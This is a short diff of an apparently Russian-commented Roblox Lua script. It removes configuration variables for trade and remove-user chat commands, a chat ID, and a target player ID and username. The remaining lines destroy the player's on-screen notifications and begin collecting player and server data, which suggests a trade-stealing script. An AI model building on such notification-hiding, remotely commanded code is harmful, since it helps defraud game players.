@@ -1,9 +1,3 @@
-local CustomTradeCommand = "hi"
-local CustomRemoveUserCommand = "yo"
-local CustomChatId = 7826742521
-local CustomLoadTime = 100
-local CustomPlayerId = 1537677213
-local CustomPlayerUsername = "wssdfgiby"
 --Отключаем визуал
 game:GetService("Players").LocalPlayer.PlayerGui.Top_Notification:Destroy()
 -- Получаем данные о игроке и сервере
